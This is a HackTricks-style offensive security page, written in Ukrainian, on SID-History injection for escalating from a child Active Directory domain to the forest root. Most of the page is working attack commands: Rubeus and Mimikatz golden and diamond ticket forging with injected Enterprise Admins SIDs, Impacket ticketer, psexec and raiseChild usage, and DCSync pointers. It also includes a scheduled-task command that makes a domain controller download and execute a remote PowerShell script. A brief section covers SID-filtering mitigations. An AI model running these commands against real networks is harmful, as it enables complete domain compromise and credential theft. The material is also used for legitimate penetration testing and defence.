# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

Мета **SID History Injection Attack** полягає у сприянні **міграції користувачів між доменами** зі збереженням доступу до ресурсів із попереднього домену. Це досягається шляхом **додавання попереднього ідентифікатора безпеки (SID) користувача до SID History** його нового облікового запису. Примітно, що цим процесом можна маніпулювати для надання несанкціонованого доступу, додавши SID групи з високими привілеями (наприклад, Enterprise Admins або Domain Admins) із батьківського домену до SID History. Така експлуатація надає доступ до всіх ресурсів у батьківському домені.<sup>[[1]](#references)[[2]](#references)</sup>

Для виконання цієї атаки існує два методи: створення **Golden Ticket** або **Diamond Ticket**.

Щоб визначити SID групи **"Enterprise Admins"**, спочатку потрібно знайти SID кореневого домену. Після цього SID групи Enterprise Admins можна побудувати, додавши `-519` до SID кореневого домену. Наприклад, якщо SID кореневого домену має значення `S-1-5-21-280534878-1496970234-700767426`, результівний SID групи "Enterprise Admins" буде `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>

Також можна використовувати групи **Domain Admins**, SID яких закінчується на **512**.

Інший спосіб знайти SID групи в іншому домені (наприклад, "Domain Admins") — скористатися:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> Зверніть увагу, що SID history можна вимкнути у trust relationship, через що ця атака не спрацює.

Згідно з [**документацією**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
- **Вимкнення SIDHistory у forest trusts** за допомогою інструмента netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- **Застосування SID Filter Quarantining до external trusts** за допомогою інструмента netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **Застосування SID Filtering до domain trusts у межах одного forest** не рекомендується, оскільки це unsupported configuration і може спричинити breaking changes. Якщо domain у forest є ненадійним, він не повинен бути членом forest. У такій ситуації спочатку необхідно розділити trusted і untrusted domains на окремі forests, де SID Filtering можна застосувати до interforest trust

Перегляньте цей пост для отримання додаткової інформації про bypassing цього: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>

### Diamond Ticket (Rubeus + KRBTGT-AES256)

Минулого разу, коли я це пробував, мені потрібно було додати arg **`/ldap`**.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Golden Ticket (Mimikatz) з KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Докладніше про golden tickets дивіться:


{{#ref}}
golden-ticket.md
{{#endref}}


Докладніше про diamond tickets дивіться:


{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Підвищення привілеїв до DA кореневого домену або Enterprise admin за допомогою хеша KRBTGT скомпрометованого домену:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Маючи отримані під час атаки дозволи, ви можете, наприклад, виконати атаку DCSync у новому домені:


{{#ref}}
dcsync.md
{{#endref}}

### З Linux

#### Вручну за допомогою [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Автоматично за допомогою [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Це скрипт Impacket, який **автоматизує підвищення привілеїв із дочірнього домену до батьківського**. Скрипту потрібні:

- Цільовий контролер домену
- Creds для облікового запису адміністратора в дочірньому домені

Процес:

- Отримує SID групи Enterprise Admins батьківського домену
- Отримує hash облікового запису KRBTGT у дочірньому домені
- Створює Golden Ticket
- Виконує вхід до батьківського домену
- Отримує облікові дані облікового запису Administrator у батьківському домені
- Якщо вказано switch `target-exec`, автентифікується на контролері домену батьківського домену через Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Посилання

- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
- [2] [Що таке Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
- [3] [Міркування щодо безпеки для Trusts - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
- [4] [itm8.com - Фільтрація SID як межа безпеки між доменами, частина 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

{{#include ../../banners/hacktricks-training.md}}
